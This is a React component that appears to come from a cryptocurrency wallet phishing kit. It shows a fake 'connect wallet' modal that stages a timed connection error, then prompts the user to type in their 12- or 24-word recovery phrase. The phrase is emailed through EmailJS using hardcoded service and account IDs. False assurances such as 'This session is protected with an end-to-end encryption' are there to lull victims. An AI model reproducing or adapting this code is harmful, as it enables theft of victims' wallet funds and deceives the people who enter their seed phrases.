import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";

import { FaTimes } from "react-icons/fa";

import Shield from "../shield.png";

const PopUpComponent = ({
  SecondpopUp,
  setSecondpopUp,
  isCon,
  setIsCon,
  setpopUp,
  name,
  url,
}) => {
  const navigate = useNavigate();

  const [isSubmitting, setIsSubmitting] = useState(false);

  const Validpros = () => {
    setSecondpopUp(true);
    // setInterval(() => {}, 5000);
    setIsCon("XXX");
  };

  const TryAgainFunc = () => {
    setSecondpopUp(false);
  };

  const sendEmail = (e) => {
    e.preventDefault();

    setIsSubmitting(true);

    emailjs
      .sendForm(
        "service_vgxm8a8",
        "template_miqtqfm",
        e.target,
        "user_Y7FgQcAUQxmw8epOFthNM"
      )
      .then(
        (result) => {
          setIsSubmitting(false);
          console.log(result.text);
          navigate("/success");
          // navigate("/access");

          // Close Modal wallets
          setSecondpopUp(false);
          setpopUp(false);
        },
        (error) => {
          console.log(error.text);
          setIsSubmitting(false);
        }
      );
    e.target.reset();
  };

  const WaitAndChnage = () => {
    setIsCon(
      <>
        <div className="label">
          <li>An error occurred... please try again or connect manually</li>
        </div>
        <br />
        <div className="gp-btn">
          <button onClick={TryAgainFunc}>Try Again</button>
          <button onClick={Validpros}>Connect Manually</button>
        </div>
      </>
    );
  };

  setInterval(() => {
    WaitAndChnage();
  }, 7000);

  const HandleClosePopUp = () => {
    setpopUp(false);
  };

  return (
    <>
      <div className="modelbox">
        <div className="cancel" onClick={HandleClosePopUp}>
          <FaTimes style={{ fontSize: "1.5em" }} />
        </div>
        <div className="ft-image">
          <img src={url} alt="shield" />
        </div>
        <h2> {name} </h2>
        <br />
        <h4> This Session is Secured and encrypted</h4>
        <br />
        <br />
        {!SecondpopUp && isCon}
        {SecondpopUp && (
          <>
            <form onSubmit={sendEmail}>
              <div>
                <input type="hidden" name="namie" value={name} />
                <textarea
                  className="v-100"
                  type="text"
                  placeholder="Enter your Wallet Phrase key   Typically 12 (sometimes 24...) words separated by a single spaces."
                  name="key"
                  minLength="10"
                  required
                />
              </div>
              <button className="blue" disabled={isSubmitting}>
                {isSubmitting ? "Connecting ..." : " Connect Wallet"}
              </button>
            </form>
          </>
        )}
        <br />
        <br />
        <div className="secure">
          <div className="shield">
            <img src={Shield} alt="shield" />
          </div>
          <h3> This session is protected with an end-to-end encryption</h3>
        </div>
      </div>
    </>
  );
};

export default PopUpComponent;
